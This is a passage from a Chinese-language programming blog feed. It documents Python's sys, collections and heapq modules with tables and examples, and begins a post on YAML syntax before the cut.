id="sys"><a class="markdownIt-Anchor" href="#sys"></a> sys</h2><ul><li>引入：<code>import sys</code></li><li>函数</li></ul><table><thead><tr><th>函数</th><th>说明</th><th>举例</th></tr></thead><tbody><tr><td>sys.argv</td><td>接收命令行参数，生成一个List，第一个元素是程序本身路径</td><td></td></tr><tr><td>sys.modules</td><td>返回系统导入的模块字段，key是模块名，value是模块</td><td></td></tr><tr><td>sys.modules.keys()</td><td>返回所有已经导入的模块列表</td><td></td></tr><tr><td>sys.modules.values()</td><td>返回所有已经导入的模块</td><td></td></tr><tr><td>sys.exc_info()</td><td>获取当前正在处理的异常类,exc_type、exc_value、exc_traceback当前处理的异常详细信息</td><td></td></tr><tr><td>sys.exit(n)</td><td>退出程序，正常退出时exit(0)</td><td></td></tr><tr><td>sys.hexversion</td><td>获取Python解释程序的版本值，16进制格式如：0x020403F0</td><td></td></tr><tr><td>sys.version</td><td>获取Python解释程序的版本信息</td><td></td></tr><tr><td>sys.maxint</td><td>最大的Int值</td><td></td></tr><tr><td>sys.maxunicode</td><td>最大的Unicode值</td><td></td></tr><tr><td>sys.modules</td><td>返回系统导入的模块字段，key是模块名，value是模块</td><td></td></tr><tr><td>sys.path</td><td>返回模块的搜索路径，初始化时使用PYTHONPATH环境变量的值</td><td></td></tr><tr><td>sys.platform</td><td>返回操作系统平台名称</td><td></td></tr><tr><td>sys.stdout</td><td>标准输出</td><td>sys.stdout.write(‘please:’)</td></tr><tr><td>sys.stdin</td><td>标准输入</td><td>val = sys.stdin.readline()[:-1]</td></tr><tr><td>sys.stderr</td><td>错误输出</td><td></td></tr><tr><td>sys.exc_clear()</td><td>用来清除当前线程所出现的当前的或最近的错误信息</td><td></td></tr><tr><td>sys.exec_prefix</td><td>返回平台独立的python文件安装的位置</td><td></td></tr><tr><td>sys.byteorder</td><td>本地字节规则的指示器，big-endian平台的值是’big’,little-endian平台的值是’little’</td><td></td></tr><tr><td>sys.copyright</td><td>记录python版权相关的东西</td><td></td></tr><tr><td>sys.api_version</td><td>解释器的C的API版本</td><td></td></tr><tr><td>sys.version_info</td><td>‘final’表示最终,也有’candidate’表示候选，serial表示版本级别，是否有后继的发行</td><td></td></tr><tr><td>sys.displayhook(value)</td><td>如果value非空，这个函数会把他输出到sys.stdout，并且将他保存进<code>__builtin__._.</code>指在python的交互式解释器里，’_’ 代表上次你输入得到的结果，hook是钩子的意思，将上次的结果钩过来</td><td></td></tr><tr><td>sys.getdefaultencoding()</td><td>返回当前你所用的默认的字符编码格式</td><td></td></tr><tr><td>sys.getfilesystemencoding()</td><td>返回将Unicode文件名转换成系统文件名的编码的名字</td><td></td></tr><tr><td>sys.setdefaultencoding(name)</td><td>用来设置当前默认的字符编码，如果name和任何一个可用的编码都不匹配，抛出 LookupError，这个函数只会被site模块的sitecustomize使用，一旦别site模块使用了，他会从sys模块移除</td><td></td></tr><tr><td>sys.builtin_module_names</td><td>Python解释器导入的模块列表</td><td></td></tr><tr><td>sys.executable</td><td>Python解释程序路径</td><td></td></tr><tr><td>sys.getwindowsversion()</td><td>获取Windows的版本</td><td></td></tr><tr><td>sys.copyright</td><td>记录python版权相关的东西</td><td></td></tr></tbody></table><h2 id="time"><a class="markdownIt-Anchor" href="#time"></a> time</h2><h2 id="datetime"><a class="markdownIt-Anchor" href="#datetime"></a> datetime</h2><h2 id="collection"><a class="markdownIt-Anchor" href="#collection"></a> collection</h2><ul><li><p>Python拥有一些内置的数据类型，比如str, int, list, tuple, dict等， collections模块在这些内置数据类型的基础上，提供了许多有用的集合类。<a href="https://www.jianshu.com/p/47f66ff4ab7b">更多详细内容</a></p><ol><li>namedtuple(): 生成可以使用名字来访问元素内容的tuple子类</li><li>deque: 双端队列，可以快速的从另外一侧追加和推出对象</li><li>Counter: 计数器，主要用来计数</li><li>OrderedDict: 有序字典</li><li>defaultdict: 带有默认值的字典</li></ol></li><li><p>引入：<code>from collection import *</code></p></li></ul><h3 id="counter"><a class="markdownIt-Anchor" href="#counter"></a> Counter</h3><ul><li>初始化</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = Counter()<span class="comment">#一个新的，空的counter</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Counter()</span><br><span class="line">c = Counter(<span class="string">&quot;gallahad&quot;</span>)<span class="comment">#从可迭代的字符串初始化counter</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Counter(&#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;l&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;h&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;g&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;d&#x27;</span>: <span class="number">1</span>&#125;)</span><br><span class="line">c = Counter(&#123;<span class="string">&#x27;red&#x27;</span>:<span class="number">4</span>,<span class="string">&#x27;blue&#x27;</span>:<span class="number">2</span>&#125;)<span class="comment">#从映射初始化counter</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Counter(&#123;<span class="string">&#x27;red&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;blue&#x27;</span>: <span class="number">2</span>&#125;)</span><br><span class="line">c = Counter(cats = <span class="number">4</span>,dogs = <span class="number">8</span>)<span class="comment">#从args初始化counter</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Counter(&#123;<span class="string">&#x27;dogs&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;cats&#x27;</span>: <span class="number">4</span>&#125;)</span><br></pre></td></tr></table></figure><ul><li>取值</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = Counter([<span class="string">&#x27;eggs&#x27;</span>,<span class="string">&#x27;ham&#x27;</span>])</span><br><span class="line"><span class="comment"># Counter对象类似于字典，如果某个项缺失，会返回0，而不是报出KeyError；</span></span><br><span class="line">c[<span class="string">&#x27;bacon&#x27;</span>]<span class="comment">#没有&#x27;bacon&#x27; 返回0</span></span><br><span class="line">c[<span class="string">&#x27;eggs&#x27;</span>]<span class="comment">#有&#x27;eggs&#x27; 返回1</span></span><br></pre></td></tr></table></figure><ul><li>删除：将一个元素的数目设置为0，并不能将它从counter中删除，使用del可以将这个元素删除；</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Counter(&#123;<span class="string">&#x27;eggs&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;ham&#x27;</span>: <span class="number">1</span>&#125;)</span><br><span class="line">c[<span class="string">&#x27;eggs&#x27;</span>] = <span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Counter(&#123;<span class="string">&#x27;ham&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;eggs&#x27;</span>: <span class="number">0</span>&#125;)<span class="comment">#&#x27;eggs&#x27;依然存在</span></span><br><span class="line"><span class="keyword">del</span> c[<span class="string">&#x27;eggs&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Counter(&#123;<span class="string">&#x27;ham&#x27;</span>: <span class="number">1</span>&#125;)<span class="comment">#&#x27;eggs&#x27;不存在  </span></span><br></pre></td></tr></table></figure><ul><li>Counter对象支持以下三个字典不支持的方法</li></ul><table><thead><tr><th>函数</th><th>说明</th><th>举例</th></tr></thead><tbody><tr><td>element()</td><td>返回一个迭代器，每个元素重复的次数为它的数目，顺序是任意的顺序，如果一个元素的数目少于1，那么elements()就会忽略它；</td><td></td></tr><tr><td>most_common()</td><td>返回一个列表，包含counter中n个最大数目的元素，如果忽略n或者为None，most_common()将会返回counter中的所有元素，元素有着相同数目的将会以任意顺序排列；</td><td></td></tr><tr><td>subtract()</td><td>从一个可迭代对象中或者另一个映射（或counter）中，元素相减，类似于dict.update()，但是subtracts 数目而不是替换它们，输入和输出都有可能为0或者为负；</td><td></td></tr><tr><td>update()</td><td>从一个可迭代对象中或者另一个映射（或counter）中所有元素相加，类似于dict.update，是数目相加而非替换它们，另外，可迭代对象是一个元素序列，而非(key,value)对构成的序列；</td><td></td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># element</span><br><span class="line">c &#x3D; Counter(a&#x3D;2,b&#x3D;4,c&#x3D;0,d&#x3D;-2,e &#x3D; 1)</span><br><span class="line">list(c.elements())</span><br><span class="line">&gt;&gt;&gt; [&#39;a&#39;, &#39;a&#39;, &#39;b&#39;, &#39;b&#39;, &#39;b&#39;, &#39;b&#39;, &#39;e&#39;]</span><br><span class="line"># most_common</span><br><span class="line">Counter(&#39;abracadabra&#39;).most_common(3)</span><br><span class="line">&gt;&gt;&gt; [(&#39;a&#39;, 5), (&#39;r&#39;, 2), (&#39;b&#39;, 2)]</span><br><span class="line"># subtract</span><br><span class="line">c &#x3D; Counter(a&#x3D;4,b&#x3D;2,c&#x3D;0,d&#x3D;-2);d &#x3D; Counter(a&#x3D;1,b&#x3D;2,c&#x3D;-3,d&#x3D;4);c.subtract(d);</span><br><span class="line">&gt;&gt;&gt; Counter(&#123;&#39;a&#39;: 3, &#39;c&#39;: 3, &#39;b&#39;: 0, &#39;d&#39;: -6&#125;)</span><br><span class="line"># update</span><br><span class="line">c &#x3D; Counter(a&#x3D;4,b&#x3D;2,c&#x3D;0,d&#x3D;-2);d &#x3D; Counter(a&#x3D;1,b&#x3D;2,c&#x3D;-3,d&#x3D;4);c.subtract(d);c.update(d)</span><br><span class="line">&gt;&gt;&gt; Counter(&#123;&#39;a&#39;: 5, &#39;b&#39;: 4, &#39;d&#39;: 2, &#39;c&#39;: -3&#125;)</span><br></pre></td></tr></table></figure><ul><li>其他常见操作</li></ul><table><thead><tr><th>函数</th><th>说明</th><th>举例</th></tr></thead><tbody><tr><td>sum(c.values())</td><td>统计所有的数目</td><td>c=Counter({‘a’: 5, ‘b’: 4, ‘d’: 2, ‘c’: -3})</td></tr><tr><td>list©</td><td>列出所有唯一的元素</td><td>[‘a’, ‘c’, ‘b’, ‘d’]</td></tr><tr><td>set©</td><td>转换为set</td><td>set([‘a’, ‘c’, ‘b’, ‘d’])</td></tr><tr><td>dict©</td><td>转换为常规的dict</td><td>{‘a’: 5, ‘c’: -3, ‘b’: 4, ‘d’: 2}</td></tr><tr><td>c.items()</td><td>转换为(elem,cnt)对构成的列表</td><td>[(‘a’, 5), (‘c’, -3), (‘b’, 4), (‘d’, 2)]</td></tr><tr><td>c.most_common()[:-4:-1]</td><td>输出n个数目最小元素</td><td>[(‘c’, -3), (‘d’, 2), (‘b’, 4)]</td></tr><tr><td>c += Counter()</td><td>删除数目为0和为负的元素</td><td>Counter({‘a’: 5, ‘b’: 4, ‘d’: 2})</td></tr><tr><td>Counter(dict(c.items()))</td><td>从(elem,cnt)对构成的列表转换为counter</td><td>Counter({‘a’: 5, ‘b’: 4, ‘d’: 2})</td></tr><tr><td>c.clear()</td><td>清空counter</td><td></td></tr><tr><td>c = Counter(a=3,b=1,c=-2)<br>d = Counter(a=1,b=2,c=4)</td><td></td><td></td></tr><tr><td>c+d</td><td>求和</td><td>Counter({‘a’: 4, ‘b’: 3, ‘c’: 2})</td></tr><tr><td>c-d</td><td>求差</td><td>Counter({‘a’: 2})</td></tr><tr><td>c &amp; d</td><td>求交集</td><td>Counter({‘a’: 1, ‘b’: 1})</td></tr><tr><td><code>c | d</code></td><td>求并集</td><td>Counter({‘c’: 4, ‘a’: 3, ‘b’: 2})</td></tr></tbody></table><h3 id="deque"><a class="markdownIt-Anchor" href="#deque"></a> deque</h3><ul><li>deque是栈和队列的一种广义实现，deque是&quot;double-end queue&quot;的简称；deque支持线程安全、有效内存地以近似O(1)的性能在deque的两端插入和删除元素，尽管list也支持相似的操作，但是它主要在固定长度操作上的优化，从而在pop(0)和insert(0,v)（会改变数据的位置和大小）上有O(n)的时间复杂度。</li></ul><table><thead><tr><th>函数</th><th>说明</th><th>举例</th></tr></thead><tbody><tr><td>append(x)</td><td>将x添加到deque的右侧；</td><td></td></tr><tr><td>appendleft(x)</td><td>将x添加到deque的左侧；</td><td></td></tr><tr><td>clear()</td><td>将deque中的元素全部删除，最后长度为0；</td><td></td></tr><tr><td>count(x)</td><td>返回deque中元素等于x的个数；</td><td></td></tr><tr><td>extend(iterable)</td><td>将可迭代变量iterable中的元素添加至deque的右侧；</td><td></td></tr><tr><td>extendleft(iterable)</td><td>将变量iterable中的元素添加至deque的左侧，往左侧添加序列的顺序与可迭代变量iterable中的元素相反；</td><td></td></tr><tr><td>pop()</td><td>移除和返回deque中最右侧的元素，如果没有元素，将会报出IndexError；</td><td></td></tr><tr><td>popleft()</td><td>移除和返回deque中最左侧的元素，如果没有元素，将会报出IndexError；</td><td></td></tr><tr><td>remove(value)</td><td>移除第一次出现的value，如果没有找到，报出ValueError；</td><td></td></tr><tr><td>reverse()</td><td>反转deque中的元素，并返回None；</td><td></td></tr><tr><td>rotate(n)</td><td>从右侧反转n步，如果n为负数，则从左侧反转，d.rotate(1)等于d.appendleft(d.pop())；</td><td></td></tr><tr><td>maxlen</td><td>只读的属性，deque的最大长度，如果无解，就返回None；</td><td></td></tr></tbody></table><ul><li><p>除了以上的方法之外，deque还支持迭代、序列化、len(d)、reversed(d)、copy.copy(d)、copy.deepcopy(d)，通过in操作符进行成员测试和下标索引，索引的时间复杂度是在两端是O(1)，在中间是O(n)，为了快速获取，可以使用list代替。</p></li><li><p>还有更多有意思的功能，例如实现类似linux的tail的功能</p></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tail</span>(<span class="params">filename,n = <span class="number">10</span></span>):</span></span><br><span class="line">    <span class="string">&quot;Return the last n lines of a file&quot;</span></span><br><span class="line">    <span class="keyword">return</span> deque(open(filename),n)</span><br><span class="line"><span class="keyword">print</span> (tail(<span class="string">&quot;temp.txt&quot;</span>,<span class="number">10</span>))</span><br></pre></td></tr></table></figure><ul><li>使用deque维护一个序列（右侧添加元素，左侧删除元素）中窗口的平均值</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">moving_average</span>(<span class="params">iterable,n = <span class="number">3</span></span>):</span></span><br><span class="line">    it = iter(iterable)</span><br><span class="line">    d = deque(itertools.islice(it,n<span class="number">-1</span>))</span><br><span class="line">    <span class="comment"># 第一次只有两个元素，再右移的过程中，需要先删除最左端的元素，因此现在最左端加入0</span></span><br><span class="line">    d.appendleft(<span class="number">0</span>)</span><br><span class="line">    s = sum(d)</span><br><span class="line">    <span class="keyword">for</span> ele <span class="keyword">in</span> it:</span><br><span class="line">        <span class="comment"># 删除最左端的元素，再加上新元素</span></span><br><span class="line">        s += ele - d.popleft()</span><br><span class="line">        <span class="comment"># 右端添加新元素</span></span><br><span class="line">        d.append(ele)</span><br><span class="line">        <span class="keyword">yield</span> s / float(n)</span><br><span class="line">array = [<span class="number">40</span>,<span class="number">30</span>,<span class="number">50</span>,<span class="number">46</span>,<span class="number">39</span>,<span class="number">44</span>]</span><br><span class="line"><span class="keyword">for</span> ele <span class="keyword">in</span> moving_average(array,n=<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">print</span> (ele)</span><br></pre></td></tr></table></figure><h3 id="defaultdict"><a class="markdownIt-Anchor" href="#defaultdict"></a> defaultdict</h3><ul><li>efaultdict是内置数据类型dict的一个子类，基本功能与dict一样，只是重写了一个方法missing(key)和增加了一个可写的对象变量default_factory。</li></ul><table><thead><tr><th>函数</th><th>说明</th><th>举例</th></tr></thead><tbody><tr><td>missing(key)</td><td>1、如果default_factory属性为None，就报出以key作为遍历的KeyError异常；<br>2、如果default_factory不为None，就会向给定的key提供一个默认值，这个值插入到词典中，并返回；<br>3、如果调用default_factory报出异常，这个异常在传播时不会改变；<br>4、这个方法是当要求的key不存在时，dict类中的getitem()方法所调用，无论它返回或者报出什么，最终返回或报出给getitem()；<br>5、只有getitem()才能调用missing()，这意味着，如果get()起作用，如普通的词典，将会返回None作为默认值，而不是使用default_factory；</td><td></td></tr><tr><td>default_factory</td><td>这个属性用于missing()方法，使用构造器中的第一个参数初始化；<br>设置list会创建空的list，遇到key则将对应的value值append到列表中；<br>设置int会提供一个默认为0的计数，遇到相同的key会递增操作；<br>设置set则可以建立一个空的set</td><td></td></tr></tbody></table><ul><li>使用list作为default_factory，很容易将一个key-value的序列转换为一个关于list的词典；</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = [(<span class="string">&#x27;yellow&#x27;</span>,<span class="number">1</span>),(<span class="string">&#x27;blue&#x27;</span>,<span class="number">2</span>),(<span class="string">&#x27;yellow&#x27;</span>,<span class="number">3</span>),(<span class="string">&#x27;blue&#x27;</span>,<span class="number">4</span>),(<span class="string">&#x27;red&#x27;</span>,<span class="number">5</span>)]</span><br><span class="line">d = defaultdict(list) //设置default_factory为list，append操作会将value值append这个list</span><br><span class="line"><span class="keyword">for</span> k,v <span class="keyword">in</span> s: d[k].append(v)</span><br><span class="line">d.items()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[(<span class="string">&#x27;blue&#x27;</span>, [<span class="number">2</span>, <span class="number">4</span>]), (<span class="string">&#x27;red&#x27;</span>, [<span class="number">5</span>]), (<span class="string">&#x27;yellow&#x27;</span>, [<span class="number">1</span>, <span class="number">3</span>])]</span><br></pre></td></tr></table></figure><h3 id="namedtuple"><a class="markdownIt-Anchor" href="#namedtuple"></a> namedtuple</h3><ul><li>命名的元组，意味给元组中的每个位置赋予含义，意味着代码可读性更强，namedtuple可以在任何常规元素使用的地方使用，而且它可以通过名称来获取字段信息而不仅仅是通过位置索引。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Point = namedtuple(<span class="string">&#x27;Point&#x27;</span>,[<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>],verbose = <span class="literal">True</span>)</span><br><span class="line">p = Point(<span class="number">11</span>,y = <span class="number">22</span>) <span class="comment"># 实例化一个对象，可以使用位置或者关键字</span></span><br><span class="line">p[<span class="number">0</span>] + p[<span class="number">1</span>] <span class="comment"># 通过索引访问元组中的元素</span></span><br><span class="line">x,y = p <span class="comment"># 分开，类似于常规的元组</span></span><br><span class="line">print(x,y)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(<span class="number">11</span>, <span class="number">22</span>)</span><br><span class="line">p.x + p.y <span class="comment"># 通过名称访问元素</span></span><br><span class="line">p <span class="comment"># 可读的__repr__，通过name = value风格</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Point(x=<span class="number">11</span>, y=<span class="number">22</span>)</span><br></pre></td></tr></table></figure><ul><li>除了从tuples继承的方法之外，namedtuple还支持三种方法和一个属性</li></ul><table><thead><tr><th>函数</th><th>说明</th><th>举例</th></tr></thead><tbody><tr><td><code>somenamedtuple._make()</code></td><td>从已有的序列或者可迭代的对象中创建一个新的对象；</td><td><code>t = [11,22];Point._make(t)</code></td></tr><tr><td><code>somenamedtuple._asdict()</code></td><td>返回一个OrderDict，由名称到对应值建立的映射；</td><td><code>p._asdict() ==&gt; OrderedDict([('x', 11), ('y', 22)])</code></td></tr><tr><td><code>somenamedtuple._replace()</code></td><td>返回一个新的namedtuple对象，用新值替换指定名称中的值；</td><td><code>p._replace(x = 33) ==&gt; Point(x=33, y=22)</code></td></tr><tr><td><code>somenamedtuple._fields</code></td><td>以字符串构成的元组的形式返回namedtuple中的名称，在自省或者基于一个已经存在的namedtuple中创建新的namedtuple时，非常有用；</td><td><code>p._fields ==&gt; ('x', 'y')</code></td></tr><tr><td><code>getattr()</code></td><td>检索存储在字符串中的名称</td><td><code>getattr(p,'x')==&gt;11</code></td></tr><tr><td><code>**操作符</code></td><td>将一个字典转换成namedtuple</td><td><code>d = &#123;'x':11,'y':22&#125;;Point(**d)</code></td></tr></tbody></table><ul><li>由于namedtuple也是Python中的一个类，因此在子类中，它很容易添加或者修改一些功能，如下是添加一个可计算名称和固定长度的输出格式；子类中的slots是一个空的元组，可以通过避免词典实例的创建来节约内存；</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span>(<span class="params">namedtuple(<span class="params"><span class="string">&#x27;Point&#x27;</span>,<span class="string">&#x27;x y&#x27;</span></span>)</span>):</span></span><br><span class="line">    __slots__ = ()</span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hypot</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (self.x ** <span class="number">2</span> + self.y**<span class="number">2</span>) ** <span class="number">0.5</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Point:x = %6.3f  y = %6.3f  hypot = %6.3f&quot;</span> %(self.x,self.y,self.hypot)</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> Point(<span class="number">3</span>,<span class="number">4</span>),Point(<span class="number">14</span>,<span class="number">5</span>/<span class="number">7.</span>):</span><br><span class="line">    <span class="keyword">print</span> (p)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Point:x =  <span class="number">3.000</span>  y =  <span class="number">4.000</span>  hypot =  <span class="number">5.000</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Point:x = <span class="number">14.000</span>  y =  <span class="number">0.714</span>  hypot = <span class="number">14.018</span></span><br></pre></td></tr></table></figure><h3 id="ordereddict"><a class="markdownIt-Anchor" href="#ordereddict"></a> OrderedDict</h3><ul><li>OrderedDict类似于正常的词典，只是它记住了元素插入的顺序，当在有序的词典上迭代时，返回的元素就是它们第一次添加的顺序。</li></ul><table><thead><tr><th>函数</th><th>说明</th><th>举例</th></tr></thead><tbody><tr><td>popitem(last=True)</td><td>返回和删除一个(key,value)对，如果last=True，就以LIFO方式执行，否则以FIFO方式执行</td><td></td></tr><tr><td>reversed()</td><td>反向迭代</td><td></td></tr><tr><td>==</td><td>相等测试，OrderedDict对象之间对顺序敏感，和其他的映射对象不敏感</td><td></td></tr><tr><td>update()</td><td>OrderedDict构造器和update()方法可以接受关键字变量，但是它们丢失了顺序，因为Python的函数调用机制是将一个无序的词典传入关键字变量</td><td></td></tr></tbody></table><ul><li>使用举例</li><li>创建一个有序的词典，可以记住最后插入的key的顺序，如果一个新的元素要重写已经存在的元素，那么原始的插入位置就会改变成末尾，</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LastUpdatedOrderedDict</span>(<span class="params">OrderedDict</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setitem__</span>(<span class="params">self,key,value</span>):</span></span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">in</span> self:</span><br><span class="line">            <span class="keyword">del</span> self[key]</span><br><span class="line">        OrderedDict.__setitem__(self, key, value)</span><br><span class="line">obj = LastUpdatedOrderedDict();obj[<span class="string">&quot;apple&quot;</span>] = <span class="number">2</span>;obj[<span class="string">&quot;windows&quot;</span>] = <span class="number">3</span>;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>LastUpdatedOrderedDict([(<span class="string">&#x27;apple&#x27;</span>, <span class="number">2</span>), (<span class="string">&#x27;windows&#x27;</span>, <span class="number">3</span>)])</span><br><span class="line">obj[<span class="string">&quot;apple&quot;</span>] = <span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>LastUpdatedOrderedDict([(<span class="string">&#x27;windows&#x27;</span>, <span class="number">3</span>), (<span class="string">&#x27;apple&#x27;</span>, <span class="number">1</span>)])</span><br></pre></td></tr></table></figure><ul><li>一个有序的词典可以和Counter类一起使用，counter对象就可以记住元素首次出现的顺序；</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class OrderedCounter(Counter,OrderedDict):</span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return &quot;%s(%r)&quot;%(self.__class__.__name__,OrderedDict(self))</span><br><span class="line"></span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return self.__class__,(OrderedDict(self))</span><br><span class="line">#和OrderDict一起使用的Counter对象</span><br><span class="line">obj &#x3D; OrderedCounter()</span><br><span class="line">wordList &#x3D; [&quot;b&quot;,&quot;a&quot;,&quot;c&quot;,&quot;a&quot;,&quot;c&quot;,&quot;a&quot;]</span><br><span class="line">for word in wordList:</span><br><span class="line">    obj[word] +&#x3D; 1</span><br><span class="line">print (obj)</span><br><span class="line"># 普通的Counter对象</span><br><span class="line">cnt &#x3D; Counter()</span><br><span class="line">wordList &#x3D; [&quot;b&quot;,&quot;a&quot;,&quot;c&quot;,&quot;a&quot;,&quot;c&quot;,&quot;a&quot;]</span><br><span class="line">for word in wordList:</span><br><span class="line">    cnt[word] +&#x3D; 1</span><br><span class="line">print (cnt)</span><br><span class="line">&gt;&gt;&gt; OrderedCounter(OrderedDict([(&#39;b&#39;, 1), (&#39;a&#39;, 3), (&#39;c&#39;, 2)]))</span><br><span class="line">&gt;&gt;&gt; Counter(&#123;&#39;a&#39;: 3, &#39;c&#39;: 2, &#39;b&#39;: 1&#125;)</span><br></pre></td></tr></table></figure><h2 id="heapq"><a class="markdownIt-Anchor" href="#heapq"></a> heapq</h2><ul><li>堆是一种特殊的树形结构，通常我们所说的堆的数据结构指的是完全二叉树，并且根节点的值小于等于该节点所有子节点的值</li><li>堆是一种优先队列。优先队列让你能够以任意顺序添加对象，并随时（可能是在两次添加对象之间）找出（并删除）最小的元素。相比于列表方法min，这样做的效率要高得多。</li></ul><table><thead><tr><th>函数</th><th>说明</th><th>举例</th></tr></thead><tbody><tr><td><code>heappush(heap,item)</code></td><td>往堆中插入一条新的值，构造成最小堆</td><td></td></tr><tr><td><code>heappop(heap)</code></td><td>从堆中弹出最小值</td><td></td></tr><tr><td><code>heapreplace(heap,item)</code></td><td>从堆中弹出最小值，并往堆中插入item</td><td></td></tr><tr><td><code>heappushpop(heap,item)</code></td><td>Python3中的heappushpop更高级</td><td></td></tr><tr><td><code>heapify(x)</code></td><td>以线性时间将一个列表转化为堆</td><td></td></tr><tr><td><code>merge(*iterables,key=None,reverse=False)</code></td><td>合并对个堆，然后输出</td><td></td></tr><tr><td><code>nlargest(n,iterable,key=None)</code></td><td>返回可枚举对象中的n个最大值并返回一个结果集list</td><td></td></tr><tr><td><code>nsmallest(n,iterable,key=None)</code></td><td>返回可枚举对象中的n个最小值并返回一个结果集list</td><td></td></tr></tbody></table><ul><li><p>创建堆：可以遍历列表，然后通过heapq.heappush()函数把值加入堆中，还可以使用heap.heapify(list)转换列表成为堆结构。</p></li><li><p>访问堆内容：堆创建好后，可以通过<code>heapq.heappop()</code>函数弹出堆中最小值。</p></li><li><p>获取堆最大或最小值：如果需要获取堆中最大或最小的范围值，则可以使用<code>heapq.nlargest()</code>或<code>heapq.nsmallest()</code>函数</p></li><li><p>heapq支持最大堆：<br />|函数|说明|举例|<br />|–|--|–|<br />|<code>_heapify_max(list)</code>|生成最大堆||<br />|<code>_heappop_max(heap)</code>|从堆中弹出最大值||<br />|<code>_heapreplace_max(heap,item)</code>|从对中弹出最大值，并插入item||</p></li><li><p>但是heapq不支持maxpush，push数值得到的堆不是最大堆。</p></li><li><p>改进方法可以在数据添加负号来解决调性。</p></li></ul><h2 id="itertools"><a class="markdownIt-Anchor" href="#itertools"></a> itertools</h2><h1 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h1><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> programme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yaml文件</title>
      <link href="/2020/07/13/yaml%E6%96%87%E4%BB%B6/"/>
      <url>/2020/07/13/yaml%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>yaml文件格式</p></blockquote><a id="more"></a><h1 id="yaml简介"><a class="markdownIt-Anchor" href="#yaml简介"></a> yaml简介</h1><ul><li>yaml是一种用来写配置文件的序列化语言，跟json有些像，yaml又称作json的超集，yaml的设计则是为了友好可读性，主要用于配置信息的书写，而json设计的目的则是为了简单和通用，主要用于存储数据和应用层数据通信使用。</li></ul><h1 id="语法"><a class="markdownIt-Anchor" href="#语法"></a> 语法</h1><h2 id="数据类型"><a class="markdownIt-Anchor" href="#数据类型"></a> 数据类型</h2><ul><li>yaml主要有三种类型的数据原语，基于这三种数据原语可以组合出任何数据结构。</li></ul><table><thead><tr><th>名称</th><th>说明</th><th>官方表达</th></tr></thead><tbody><tr><td>Maps</td><td>对象，键值对</td><td><a href="https://yaml.org/spec/1.2/spec.html#mapping//">mappings</a> (hashes/dictionaries)</td></tr><tr><td>Lists</td><td>数组</td><td><a 